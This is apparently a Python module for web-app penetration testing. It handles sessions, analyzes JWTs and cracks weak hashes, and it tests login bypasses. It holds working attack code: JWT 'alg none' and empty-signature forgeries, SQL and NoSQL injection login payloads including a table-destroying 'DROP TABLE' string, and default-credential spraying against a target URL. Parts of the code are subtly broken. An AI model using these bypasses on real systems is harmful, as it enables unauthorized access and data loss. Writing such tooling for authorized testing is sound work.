"""
Advanced Authentication Handler for Dynamic Testing
================================================

Comprehensive authentication handling for security testing scenarios
including session management, multi-factor authentication, and bypass techniques.
"""

import asyncio
import json
import re
import time
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
import logging

import aiohttp
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from bs4 import BeautifulSoup
import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import hashlib
import hmac


@dataclass
class AuthCredentials:
    """Authentication credentials container"""
    username: str
    password: str
    domain: Optional[str] = None
    additional_fields: Optional[Dict[str, str]] = None


@dataclass
class AuthenticationResult:
    """Authentication attempt result"""
    success: bool
    session_data: Optional[Dict[str, Any]] = None
    tokens: Optional[Dict[str, str]] = None
    cookies: Optional[Dict[str, str]] = None
    headers: Optional[Dict[str, str]] = None
    error_message: Optional[str] = None
    bypass_techniques_used: Optional[List[str]] = None


class SessionManager:
    """Advanced session management with persistence and recovery"""

    def __init__(self):
        self.active_sessions: Dict[str, Dict[str, Any]] = {}
        self.session_timeouts: Dict[str, float] = {}
        self.logger = logging.getLogger(__name__)

    def create_session(self, session_id: str, auth_data: Dict[str, Any],
                      timeout: int = 3600) -> bool:
        """Create new authenticated session"""
        try:
            self.active_sessions[session_id] = {
                'auth_data': auth_data,
                'created_at': time.time(),
                'last_used': time.time(),
                'request_count': 0
            }
            self.session_timeouts[session_id] = timeout
            self.logger.info(f"Created session {session_id}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create session {session_id}: {e}")
            return False

    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Retrieve session data if valid"""
        if session_id not in self.active_sessions:
            return None

        session = self.active_sessions[session_id]
        current_time = time.time()

        # Check if session expired
        if (current_time - session['created_at']) > self.session_timeouts[session_id]:
            self.remove_session(session_id)
            return None

        # Update last used time
        session['last_used'] = current_time
        session['request_count'] += 1

        return session

    def remove_session(self, session_id: str) -> bool:
        """Remove session from manager"""
        try:
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]
            if session_id in self.session_timeouts:
                del self.session_timeouts[session_id]
            self.logger.info(f"Removed session {session_id}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to remove session {session_id}: {e}")
            return False

    def cleanup_expired_sessions(self) -> int:
        """Remove all expired sessions"""
        current_time = time.time()
        expired_sessions = []

        for session_id, session in self.active_sessions.items():
            if (current_time - session['created_at']) > self.session_timeouts[session_id]:
                expired_sessions.append(session_id)

        for session_id in expired_sessions:
            self.remove_session(session_id)

        return len(expired_sessions)


class JWTAnalyzer:
    """JWT token analysis and manipulation"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    def decode_jwt(self, token: str, verify: bool = False,
                   secret: Optional[str] = None) -> Optional[Dict[str, Any]]:
        """Decode JWT token with optional verification"""
        try:
            if verify and secret:
                payload = jwt.decode(token, secret, algorithms=['HS256', 'RS256'])
            else:
                payload = jwt.decode(token, options={"verify_signature": False})
            return payload
        except Exception as e:
            self.logger.error(f"Failed to decode JWT: {e}")
            return None

    def analyze_jwt_vulnerabilities(self, token: str) -> List[str]:
        """Analyze JWT for common vulnerabilities"""
        vulnerabilities = []

        try:
            # Decode header and payload
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Check for algorithm confusion
            if header.get('alg') == 'none':
                vulnerabilities.append("Algorithm set to 'none'")

            # Check for weak secrets (common patterns)
            if self._check_weak_secret(token):
                vulnerabilities.append("Potentially weak secret")

            # Check for long expiration times
            if 'exp' in payload:
                exp_time = payload['exp']
                current_time = time.time()
                if exp_time - current_time > 86400 * 365:  # More than a year
                    vulnerabilities.append("Extremely long expiration time")

            # Check for sensitive information in payload
            sensitive_fields = ['password', 'secret', 'key', 'private']
            for field in payload:
                if any(sensitive in field.lower() for sensitive in sensitive_fields):
                    vulnerabilities.append(f"Sensitive field in payload: {field}")

        except Exception as e:
            self.logger.error(f"JWT analysis error: {e}")
            vulnerabilities.append("Failed to parse JWT")

        return vulnerabilities

    def _check_weak_secret(self, token: str) -> bool:
        """Check if JWT uses common weak secrets"""
        weak_secrets = [
            'secret', 'password', '123456', 'test', 'admin',
            'key', 'jwt', 'token', 'auth', 'login'
        ]

        for secret in weak_secrets:
            try:
                jwt.decode(token, secret, algorithms=['HS256'])
                return True
            except:
                continue

        return False

    def generate_jwt_bypass_attempts(self, original_token: str) -> List[str]:
        """Generate JWT tokens for bypass testing"""
        bypass_tokens = []

        try:
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})

            # Algorithm confusion attacks
            header_none = header.copy()
            header_none['alg'] = 'none'
            none_token = base64.urlsafe_b64encode(
                json.dumps(header_none).encode()
            ).decode().rstrip('=') + '.' + base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=') + '.'
            bypass_tokens.append(none_token)

            # Empty signature
            parts = original_token.split('.')
            if len(parts) == 3:
                empty_sig_token = f"{parts[0]}.{parts[1]}."
                bypass_tokens.append(empty_sig_token)

            # Privilege escalation attempts
            if 'role' in payload:
                elevated_payload = payload.copy()
                elevated_payload['role'] = 'admin'
                # Note: This would need proper signing in real scenario

            if 'admin' in payload:
                elevated_payload = payload.copy()
                elevated_payload['admin'] = True

        except Exception as e:
            self.logger.error(f"JWT bypass generation error: {e}")

        return bypass_tokens


class PasswordHashAnalyzer:
    """Password hash analysis and cracking attempts"""

    def __init__(self):
        self.common_passwords = [
            'password', '123456', 'admin', 'test', 'guest',
            'user', 'root', 'administrator', 'pass', '12345'
        ]
        self.logger = logging.getLogger(__name__)

    def identify_hash_type(self, hash_value: str) -> str:
        """Identify hash algorithm based on format"""
        if re.match(r'^[a-f0-9]{32}$', hash_value):
            return 'MD5'
        elif re.match(r'^[a-f0-9]{40}$', hash_value):
            return 'SHA1'
        elif re.match(r'^[a-f0-9]{64}$', hash_value):
            return 'SHA256'
        elif re.match(r'^\$2[aby]?\$\d+\$', hash_value):
            return 'bcrypt'
        elif re.match(r'^\$6\$', hash_value):
            return 'SHA512crypt'
        elif re.match(r'^\$1\$', hash_value):
            return 'MD5crypt'
        else:
            return 'Unknown'

    def attempt_common_passwords(self, hash_value: str,
                                hash_type: str) -> Optional[str]:
        """Attempt to crack hash with common passwords"""
        for password in self.common_passwords:
            if self._hash_password(password, hash_type) == hash_value:
                return password
        return None

    def _hash_password(self, password: str, hash_type: str) -> str:
        """Hash password with specified algorithm"""
        if hash_type == 'MD5':
            return hashlib.md5(password.encode()).hexdigest()
        elif hash_type == 'SHA1':
            return hashlib.sha1(password.encode()).hexdigest()
        elif hash_type == 'SHA256':
            return hashlib.sha256(password.encode()).hexdigest()
        else:
            return ""


class AuthenticationHandler:
    """Advanced authentication handler with bypass capabilities"""

    def __init__(self, headless: bool = True):
        self.session_manager = SessionManager()
        self.jwt_analyzer = JWTAnalyzer()
        self.password_analyzer = PasswordHashAnalyzer()
        self.headless = headless
        self.logger = logging.getLogger(__name__)

        # Common authentication bypass techniques
        self.bypass_techniques = [
            'sql_injection_auth_bypass',
            'nosql_injection_auth_bypass',
            'ldap_injection_auth_bypass',
            'authentication_token_manipulation',
            'session_fixation',
            'brute_force_weak_credentials',
            'default_credentials',
            'oauth_vulnerabilities',
            'saml_vulnerabilities'
        ]

    async def authenticate(self, target_url: str, credentials: AuthCredentials,
                          auth_type: str = 'form') -> AuthenticationResult:
        """Perform authentication with specified method"""
        try:
            if auth_type == 'form':
                return await self._form_authentication(target_url, credentials)
            elif auth_type == 'basic':
                return await self._basic_authentication(target_url, credentials)
            elif auth_type == 'bearer':
                return await self._bearer_authentication(target_url, credentials)
            elif auth_type == 'oauth':
                return await self._oauth_authentication(target_url, credentials)
            else:
                return AuthenticationResult(
                    success=False,
                    error_message=f"Unsupported authentication type: {auth_type}"
                )
        except Exception as e:
            self.logger.error(f"Authentication error: {e}")
            return AuthenticationResult(
                success=False,
                error_message=str(e)
            )

    async def _form_authentication(self, target_url: str,
                                  credentials: AuthCredentials) -> AuthenticationResult:
        """Handle form-based authentication"""
        driver = None
        try:
            # Setup Chrome driver
            chrome_options = webdriver.ChromeOptions()
            if self.headless:
                chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')

            driver = webdriver.Chrome(options=chrome_options)
            driver.get(target_url)

            # Find login form
            login_form = self._find_login_form(driver)
            if not login_form:
                return AuthenticationResult(
                    success=False,
                    error_message="No login form found"
                )

            # Fill credentials
            username_field = driver.find_element(By.NAME, "username") or \
                           driver.find_element(By.NAME, "email") or \
                           driver.find_element(By.ID, "username") or \
                           driver.find_element(By.ID, "email")

            password_field = driver.find_element(By.NAME, "password") or \
                           driver.find_element(By.ID, "password")

            username_field.clear()
            username_field.send_keys(credentials.username)
            password_field.clear()
            password_field.send_keys(credentials.password)

            # Submit form
            submit_button = driver.find_element(By.XPATH, "//input[@type='submit']") or \
                          driver.find_element(By.XPATH, "//button[@type='submit']")
            submit_button.click()

            # Wait for response
            WebDriverWait(driver, 10).until(
                lambda d: d.current_url != target_url or
                self._check_auth_success(d)
            )

            # Check if authentication succeeded
            if self._check_auth_success(driver):
                session_data = {
                    'cookies': {c['name']: c['value'] for c in driver.get_cookies()},
                    'current_url': driver.current_url
                }

                return AuthenticationResult(
                    success=True,
                    session_data=session_data,
                    cookies=session_data['cookies']
                )
            else:
                return AuthenticationResult(
                    success=False,
                    error_message="Authentication failed - invalid credentials"
                )

        except Exception as e:
            self.logger.error(f"Form authentication error: {e}")
            return AuthenticationResult(
                success=False,
                error_message=str(e)
            )
        finally:
            if driver:
                driver.quit()

    async def _basic_authentication(self, target_url: str,
                                   credentials: AuthCredentials) -> AuthenticationResult:
        """Handle HTTP Basic authentication"""
        try:
            auth = aiohttp.BasicAuth(credentials.username, credentials.password)

            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, auth=auth) as response:
                    if response.status == 200:
                        return AuthenticationResult(
                            success=True,
                            headers={'Authorization': f'Basic {base64.b64encode(f"{credentials.username}:{credentials.password}".encode()).decode()}'}
                        )
                    else:
                        return AuthenticationResult(
                            success=False,
                            error_message=f"Basic auth failed with status {response.status}"
                        )
        except Exception as e:
            return AuthenticationResult(
                success=False,
                error_message=str(e)
            )

    async def _bearer_authentication(self, target_url: str,
                                    credentials: AuthCredentials) -> AuthenticationResult:
        """Handle Bearer token authentication"""
        try:
            headers = {'Authorization': f'Bearer {credentials.password}'}

            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, headers=headers) as response:
                    if response.status == 200:
                        # Analyze JWT if it's a JWT token
                        if credentials.password.count('.') == 2:
                            jwt_vulns = self.jwt_analyzer.analyze_jwt_vulnerabilities(
                                credentials.password
                            )
                            if jwt_vulns:
                                self.logger.warning(f"JWT vulnerabilities found: {jwt_vulns}")

                        return AuthenticationResult(
                            success=True,
                            tokens={'bearer': credentials.password},
                            headers=headers
                        )
                    else:
                        return AuthenticationResult(
                            success=False,
                            error_message=f"Bearer auth failed with status {response.status}"
                        )
        except Exception as e:
            return AuthenticationResult(
                success=False,
                error_message=str(e)
            )

    async def _oauth_authentication(self, target_url: str,
                                   credentials: AuthCredentials) -> AuthenticationResult:
        """Handle OAuth authentication flow"""
        # Simplified OAuth implementation
        try:
            # This would typically involve multiple steps:
            # 1. Redirect to authorization server
            # 2. User consent
            # 3. Authorization code exchange
            # 4. Access token retrieval

            return AuthenticationResult(
                success=False,
                error_message="OAuth flow requires interactive implementation"
            )
        except Exception as e:
            return AuthenticationResult(
                success=False,
                error_message=str(e)
            )

    def _find_login_form(self, driver) -> bool:
        """Find login form on page"""
        try:
            # Look for common form indicators
            forms = driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                inputs = form.find_elements(By.TAG_NAME, "input")
                input_types = [inp.get_attribute("type") for inp in inputs]
                if "password" in input_types:
                    return True
            return False
        except:
            return False

    def _check_auth_success(self, driver) -> bool:
        """Check if authentication was successful"""
        try:
            # Common indicators of successful authentication
            success_indicators = [
                "dashboard", "profile", "logout", "welcome",
                "account", "settings", "admin"
            ]

            page_source = driver.page_source.lower()
            return any(indicator in page_source for indicator in success_indicators)
        except:
            return False

    async def test_authentication_bypass(self, target_url: str,
                                       original_credentials: AuthCredentials) -> List[AuthenticationResult]:
        """Test various authentication bypass techniques"""
        bypass_results = []

        # SQL Injection bypass attempts
        sql_payloads = [
            "admin' --",
            "admin' OR '1'='1' --",
            "admin') OR ('1'='1' --",
            "'; DROP TABLE users; --"
        ]

        for payload in sql_payloads:
            bypass_creds = AuthCredentials(
                username=payload,
                password="anything"
            )
            result = await self.authenticate(target_url, bypass_creds, 'form')
            if result.success:
                result.bypass_techniques_used = ['sql_injection_auth_bypass']
                bypass_results.append(result)

        # NoSQL injection bypass attempts
        nosql_payloads = [
            {"$ne": ""},
            {"$regex": ".*"},
            {"$exists": True}
        ]

        # Default credentials testing
        default_creds = [
            AuthCredentials("admin", "admin"),
            AuthCredentials("administrator", "administrator"),
            AuthCredentials("root", "root"),
            AuthCredentials("guest", "guest"),
            AuthCredentials("test", "test")
        ]

        for creds in default_creds:
            result = await self.authenticate(target_url, creds, 'form')
            if result.success:
                result.bypass_techniques_used = ['default_credentials']
                bypass_results.append(result)

        return bypass_results

    async def analyze_session_security(self, session_cookies: Dict[str, str]) -> Dict[str, Any]:
        """Analyze session security properties"""
        analysis = {
            'secure_flags': [],
            'httponly_flags': [],
            'samesite_flags': [],
            'vulnerabilities': []
        }

        for cookie_name, cookie_value in session_cookies.items():
            # Check for session-related cookies
            if any(keyword in cookie_name.lower() for keyword in ['session', 'auth', 'token']):
                # Analyze cookie security attributes
                # Note: This would require access to full cookie attributes
                if len(cookie_value) < 16:
                    analysis['vulnerabilities'].append(f"Short session ID: {cookie_name}")

                # Check for predictable patterns
                if cookie_value.isdigit():
                    analysis['vulnerabilities'].append(f"Numeric session ID: {cookie_name}")

        return analysis

    def generate_session_fixation_test(self, target_url: str) -> Dict[str, Any]:
        """Generate session fixation attack test"""
        return {
            'technique': 'session_fixation',
            'description': 'Test if application accepts pre-set session IDs',
            'test_steps': [
                'Set custom session ID before authentication',
                'Authenticate with valid credentials',
                'Check if custom session ID is maintained',
                'Verify if session has elevated privileges'
            ]
        }

    async def cleanup_sessions(self) -> int:
        """Cleanup expired authentication sessions"""
        return self.session_manager.cleanup_expired_sessions()